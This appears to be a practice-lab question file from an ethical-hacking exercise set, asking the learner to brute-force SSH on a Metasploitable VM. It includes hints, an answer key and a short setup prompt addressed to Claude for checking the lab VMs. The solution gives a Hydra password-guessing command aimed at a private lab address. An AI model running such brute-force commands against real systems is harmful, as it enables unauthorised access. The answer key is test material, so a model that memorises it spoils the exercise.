# Q050 — Hydra SSH Bruteforce

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `metasploit`, `hydra`, `john`, `hashcat`, `linpeas`, `mimikatz` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Bruteforce SSH on Metasploitable for user `msfadmin` using a small wordlist. Report the **discovered password**.

---

## 🎯 Flag Format

```
ssh_pass=<word>
```

Example: `ssh_pass=msfadmin`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://<ip>` (or smaller list).
</details>

<details>
<summary>Hint 2</summary>

msfadmin password equals username.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
hydra -l msfadmin -P /usr/share/wordlists/fasttrack.txt ssh://192.168.52.129
```

Hydra cracks `msfadmin:msfadmin`.

**Answer:** `ssh_pass=msfadmin`

📖 Ref: [tools/hydra.md](../../tools/hydra.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q050".
```
